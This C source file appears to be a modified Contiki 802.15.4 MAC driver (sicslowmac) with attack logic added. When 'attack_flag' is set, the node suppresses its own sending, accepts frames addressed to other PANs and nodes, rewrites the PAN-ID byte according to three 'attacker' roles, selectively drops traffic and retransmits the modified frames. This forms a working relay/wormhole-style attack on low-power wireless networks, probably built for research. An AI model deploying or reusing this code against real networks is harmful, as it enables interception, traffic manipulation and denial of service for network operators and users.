
#include <string.h>
#include "net/mac/sicslowmac.h"
#include "net/mac/frame802154.h"
#include "net/packetbuf.h"
#include "net/packetbuf.c"
#include "cc2420.h"
#include "net/queuebuf.h"
#include "net/netstack.h"
#include "lib/random.h"

#define DEBUG 0

#if DEBUG
#include <stdio.h>
#define PRINTF(...) printf(__VA_ARGS__)
#define PRINTADDR(addr) PRINTF(" %02x%02x:%02x%02x:%02x%02x:%02x%02x ", ((uint8_t *)addr)[0], ((uint8_t *)addr)[1], ((uint8_t *)addr)[2], ((uint8_t *)addr)[3], ((uint8_t *)addr)[4], ((uint8_t *)addr)[5], ((uint8_t *)addr)[6], ((uint8_t *)addr)[7])
#else
#define PRINTF(...)
#define PRINTADDR(addr)
#endif
int attack_flag=0;

int attacker=0;


/**  \brief The sequence number (0x00 - 0xff) added to the transmitted
 *   data or MAC command frame. The default is a random value within
 *   the range.
 */
static uint8_t mac_dsn;

/**  \brief The 16-bit identifier of the PAN on which the device is
 *   sending to.  If this value is 0xffff, the device is not
 *   associated.
 */
static uint16_t mac_dst_pan_id = IEEE802154_PANID;

/**  \brief The 16-bit identifier of the PAN on which the device is
 *   operating.  If this value is 0xffff, the device is not
 *   associated.
 */
static uint16_t mac_src_pan_id = IEEE802154_PANID;

/*---------------------------------------------------------------------------*/
static int
is_broadcast_addr(uint8_t mode, uint8_t *addr)
{
    int i = mode == FRAME802154_SHORTADDRMODE ? 2 : 8;
    while(i-- > 0) {
        if(addr[i] != 0xff) {
            return 0;
        }
    }
    return 1;
}
/*---------------------------------------------------------------------------*/
static void
send_packet(mac_callback_t sent, void *ptr)
{
    frame802154_t params;
    uint8_t len;

    if(attack_flag)//////////////
        return;//////
    /* init to zeros */
    memset(&params, 0, sizeof(params));

    /* Build the FCF. */
    params.fcf.frame_type = FRAME802154_DATAFRAME;
    params.fcf.security_enabled = 0;
    params.fcf.frame_pending = 0;
    params.fcf.ack_required = packetbuf_attr(PACKETBUF_ATTR_RELIABLE);
    params.fcf.panid_compression = 0;

    /* Insert IEEE 802.15.4 (2003) version bit. */
    params.fcf.frame_version = FRAME802154_IEEE802154_2003;

    /* Increment and set the data sequence number. */
    params.seq = mac_dsn++;

    /* Complete the addressing fields. */
    /**
       \todo For phase 1 the addresses are all long. We'll need a mechanism
       in the rime attributes to tell the mac to use long or short for phase 2.
    */
    params.fcf.src_addr_mode = FRAME802154_LONGADDRMODE;
    params.dest_pid = mac_dst_pan_id;

    /*
     *  If the output address is NULL in the Rime buf, then it is broadcast
     *  on the 802.15.4 network.
     */
    if(rimeaddr_cmp(packetbuf_addr(PACKETBUF_ADDR_RECEIVER), &rimeaddr_null)) {
        /* Broadcast requires short address mode. */
        params.fcf.dest_addr_mode = FRAME802154_SHORTADDRMODE;
        params.dest_addr[0] = 0xFF;
        params.dest_addr[1] = 0xFF;

    } else {
        rimeaddr_copy((rimeaddr_t *)&params.dest_addr,
                      packetbuf_addr(PACKETBUF_ADDR_RECEIVER));
        params.fcf.dest_addr_mode = FRAME802154_LONGADDRMODE;
    }

    /* Set the source PAN ID to the global variable. */
    params.src_pid = mac_src_pan_id;

    /*
     * Set up the source address using only the long address mode for
     * phase 1.
     */
#if NETSTACK_CONF_BRIDGE_MODE
    rimeaddr_copy((rimeaddr_t *)&params.src_addr,packetbuf_addr(PACKETBUF_ADDR_SENDER));
#else
    rimeaddr_copy((rimeaddr_t *)&params.src_addr, &rimeaddr_node_addr);
#endif

    params.payload = packetbuf_dataptr();
    params.payload_len = packetbuf_datalen();
    len = frame802154_hdrlen(&params);
    if(packetbuf_hdralloc(len)) {
        int ret;
        frame802154_create(&params, packetbuf_hdrptr(), len);

        PRINTF("6MAC-UT: %2X", params.fcf.frame_type);
        PRINTADDR(params.dest_addr);
        PRINTF("%u %u (%u)\n", len, packetbuf_datalen(), packetbuf_totlen());

        ret = NETSTACK_RADIO.send(packetbuf_hdrptr(), packetbuf_totlen());
        if(sent) {
            switch(ret) {
            case RADIO_TX_OK:
                sent(ptr, MAC_TX_OK, 1);
                break;
            case RADIO_TX_ERR:
                sent(ptr, MAC_TX_ERR, 1);
                break;
            }
        }
    } else {
        PRINTF("6MAC-UT: too large header: %u\n", len);
    }
}
/*---------------------------------------------------------------------------*/
void
send_list(mac_callback_t sent, void *ptr, struct rdc_buf_list *buf_list)
{
    if(buf_list != NULL) {
        queuebuf_to_packetbuf(buf_list->buf);
        send_packet(sent, ptr);
    }
}
/*---------------------------------------------------------------------------*/
static void
input_packet(void)
{
    int flag=0;
    uint8_t *t;
    frame802154_t frame;
    int len;
    int ret;
    len = packetbuf_datalen();

    if(frame802154_parse(packetbuf_dataptr(), len, &frame) &&
            packetbuf_hdrreduce(len - frame.payload_len)) {
        if(frame.fcf.dest_addr_mode) {
            if(frame.dest_pid != mac_src_pan_id &&
                    frame.dest_pid != FRAME802154_BROADCASTPANDID) {
                /* Not broadcast or for our PAN */
                PRINTF("6MAC: for another pan %u\n", frame.dest_pid);
                if(!attack_flag)
                    return;

            }
            if(!is_broadcast_addr(frame.fcf.dest_addr_mode, frame.dest_addr)) {
                packetbuf_set_addr(PACKETBUF_ADDR_RECEIVER, (rimeaddr_t *)&frame.dest_addr);
#if !NETSTACK_CONF_BRIDGE_MODE
                if(!rimeaddr_cmp(packetbuf_addr(PACKETBUF_ADDR_RECEIVER),
                                 &rimeaddr_node_addr)) {
                    /* Not for this node */
                    PRINTF("6MAC: not for us\n");
                    if(!attack_flag)
                        return;
                    /* if(monitor)
                     {
                    t=packetbuf_hdrptr();

                    if(t[11]==monitor_target)
                    {
                    	printf("6mac: rssi %u %d \n",t[11],rssi_stored);
                    	if(rssi_stored<3)
                    		mrssi[rssi_stored++] = cc2420_last_rssi-45;	//at t[11] getting source address
                    	if(rssi_stored==3)
                    	{
                    		uint16_t x=2802;
                    		setreg(17,x);
                    		//cc2420_init();
                    		monitor=0;
                    	}
                    }
                    return;
                     }*/


//--------------------------------------------------------------------------------------
                    PRINTF("6MAC-IN: %2X", frame.fcf.frame_type);
                    PRINTADDR(packetbuf_addr(PACKETBUF_ADDR_SENDER));
                    PRINTADDR(packetbuf_addr(PACKETBUF_ADDR_RECEIVER));
                    PRINTF("%u\n", packetbuf_datalen());

                    t=packetbuf_hdrptr();

                    if(attacker==1)	{
                        switch(t[4])
                        {
                        case 245:
                            t[4]=171;
                            break;
                        case 171:
                            t[4]=246;
                            break;
                        case 247:
                            return;
                            break;
                        case 18:
                            return;     //tunnel pid

                        }
                    }
                    if(attacker==2)
                    {
                        if(t[4]==171)
                            return;

                        if(t[4]==246)
                            t[4]=247;
                        else if(t[4]==248)
                            t[4]=245;
                    }
                    if(attacker==3)
                    {
                        switch(t[4])
                        {
                        case 171:
                            t[4]=248;
                            flag=1;
                            break;
                        case 247:
                            t[4]=171;
                            break;
                        case 245:
                            return;
                            break;
                        case 18:
                            return;     //tunnel pid
                        }
                    }
                    do {
                        ret = NETSTACK_RADIO.send(packetbuf_hdrptr(), packetbuf_totlen()+21);
                        if(ret == RADIO_TX_ERR)
                            printf("\ntrmission ERR \n");
                        if(ret==RADIO_TX_OK)
                            return;
                    }
                    while(ret == RADIO_TX_ERR);
//--------------------------------------------------------------------------------------------------------------------------
                }
#endif
            }
        }

        if(attack_flag)
        {
            if(is_broadcast_addr(frame.fcf.dest_addr_mode, frame.dest_addr)) {
                PRINTF("6MAC-IN: BROADCAST Packet   ");

                t=packetbuf_hdrptr();
                if(attacker==1) {
                    switch(t[4])
                    {
                    case 245:
                        t[4]=171;
                        break;
                    case 171:
                        t[4]=246;
                        flag=1;
                        break;
                    case 247:
                        return;
                        break;
                    case 18:
                        return;     //tunnel pid
                    }
                }
                if(attacker==2)
                {
                    if(t[4]==171)
                        return;

                    if(t[4]==246)
                        t[4]=247;
                    else if(t[4]==248)
                        t[4]=245;
                }
                if(attacker==3)
                {
                    switch(t[4])
                    {
                    case 171:
                        t[4]=248;
                        flag=1;
                        break;
                    case 247:
                        t[4]=171;
                        break;
                    case 245:
                        return;
                        break;
                    case 18:
                        return;     //tunnel pid
                    }

                }

                do {
                    ret = NETSTACK_RADIO.send(packetbuf_hdrptr(), packetbuf_totlen()+21-6);
                    if(ret == RADIO_TX_ERR)
                        printf("\ntrmission ERR B\n");
                    if(ret==RADIO_TX_OK)
                        break;
                }
                while(ret == RADIO_TX_ERR);
            }
        }
        packetbuf_set_addr(PACKETBUF_ADDR_SENDER, (rimeaddr_t *)&frame.src_addr);

        PRINTF("6MAC-IN: %2X", frame.fcf.frame_type);
        PRINTADDR(packetbuf_addr(PACKETBUF_ADDR_SENDER));
        PRINTADDR(packetbuf_addr(PACKETBUF_ADDR_RECEIVER));
        PRINTF("%u\n", packetbuf_datalen());

        // if(flag==1) //broadcasting packet for our us
        //   t[4]=171;   //setting aaaa pan id
        /*if(monitor)
        {
        	t=packetbuf_hdrptr();

        	if(t[11]==monitor_target)
        	{
        		printf("6mac: rssi %u %d \n",t[11],rssi_stored);
        		if(rssi_stored<3)
        			mrssi[rssi_stored++] = cc2420_last_rssi-45;	//at t[11] getting source address
        		if(rssi_stored==3)
        		{
        			//cc2420_init();
        			uint16_t x=2802;
        			setreg(17,x);
        			monitor=0;
        		}
        	}
        }*/


        if(!attack_flag)
            NETSTACK_MAC.input();
    } else {
        PRINTF("6MAC: failed to parse hdr\n");
    }
}
/*---------------------------------------------------------------------------*/
static int
on(void)
{
    return NETSTACK_RADIO.on();
}
/*---------------------------------------------------------------------------*/
static int
off(int keep_radio_on)
{
    if(keep_radio_on) {
        return NETSTACK_RADIO.on();
    } else {
        return NETSTACK_RADIO.off();
    }
}
/*---------------------------------------------------------------------------*/
static void
init(void)
{
    mac_dsn = random_rand() % 256;

    NETSTACK_RADIO.on();
}
/*---------------------------------------------------------------------------*/
static unsigned short
channel_check_interval(void)
{
    return 0;
}
/*---------------------------------------------------------------------------*/
const struct rdc_driver sicslowmac_driver = {
    "sicslowmac",
    init,
    send_packet,
    send_list,
    input_packet,
    on,
    off,
    channel_check_interval
};
/*---------------------------------------------------------------------------*/
